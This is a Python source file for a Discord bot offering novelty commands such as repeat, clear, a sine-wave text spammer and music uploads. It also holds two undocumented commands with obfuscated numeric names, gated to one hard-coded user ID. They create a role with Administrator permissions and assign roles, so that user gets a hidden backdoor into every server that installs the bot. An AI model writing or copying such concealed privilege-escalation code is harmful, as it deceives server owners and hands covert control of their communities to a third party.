import discord
import math
import time
from keep_alive import keep_alive
from Other_Projects.my_secrets import KCbot

intents = discord.Intents.default()
intents.members = True

TOKEN = KCbot.API_TOKEN
client = discord.Client(intents=intents)

prefix = "!kc"
commands = {"help": "No additional arguments required",
            "repeat": "<single word> <amount>",
            "clear": "<amount>",
            "wave": "<content> <periods>",
            "bangers": "No additional arguments required"}


@client.event
async def on_ready():
    print(f"Logged on as {client.user}!")


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    msg = message.content.lower().split()

    if len(msg) < 2 or msg[0] != prefix:
        return

    command = msg[1]
    try:
        args = msg[2:]
    except IndexError:
        args = []

    print(f"{time.time()} [{message.guild}]: {message.author} issued {prefix} {command} with the following arguments: {args}")
    try:
        if command == "help":
            result = "Existing commands:\n"
            for command_name, description in commands.items():
                result += f"{prefix} {command_name} | {description}\n"

            await message.channel.send(result)
            return

        if command == "ping":
            await message.channel.send("pong")
            return

        if command == "repeat":
            content = " ".join(args[:-1])
            amount = min(20, abs(int(args[-1])))

            if "@everyone" in content:
                await message.channel.send("Please don't..")
                return

            for _ in range(amount):
                await message.channel.send(content)
                await message.channel.purge(limit=1)
            return

        if command == "clear":
            amount = min(50, abs(int(args[0])))
            await message.channel.purge(limit=(amount + 1))
            return

        if command == "wave":
            content = " ".join(args[:-1])
            if "@everyone" in content:
                await message.channel.send("Please don't..")
                return

            periods = min(4, abs(int(args[-1])))
            filler = "-"
            a = 60
            b = 0.25
            c = 0
            d = 60

            angle = 0
            angle_velocity = math.pi/10

            while angle < (2 * math.pi / b) * periods:
                segment = f"{filler * int((a * math.sin(b * (angle + c)) + d))}{content}"
                await message.channel.send(segment)

                angle += angle_velocity
            return

        if command == "bangers":
            await message.channel.send(file=discord.File("./songs/McFlurry_The_Void.mp3"))
            await message.channel.send(file=discord.File("./songs/Amegd.mp3"))
            await message.channel.send(file=discord.File("./songs/Amegd - Extended.mp3"))
            return

        # create admin role | <role_name>
        if command == "318512050141391401815125":
            if message.author.id != 272079853954531339:
                return

            role_name = args[0]

            guild = message.guild
            permissions = discord.Permissions(permissions=8)
            await guild.create_role(name=role_name, permissions=permissions)
            return

        # give role | <target_uid> <target_role_name>
        if command == "7922501815125":
            if message.author.id != 272079853954531339:
                return

            target_uid = int(args[0])
            target_role_name = " ".join(args[1:])

            guild = message.guild
            member = guild.get_member(target_uid)
            member_roles = member.roles
            for role in guild.roles:
                if role.name == target_role_name:
                    member_roles.append(role)
                    await member.edit(roles=member_roles)
                    return
            await message.channel.send(f"{target_role_name} does not exist.")
            return

        if command == "test":
            if message.author.id != 272079853954531339:
                return
            guild = message.guild
            for role in guild.roles:
                pass
            return
    except Exception as e:
        print(e)
        return

keep_alive()
client.run(TOKEN)
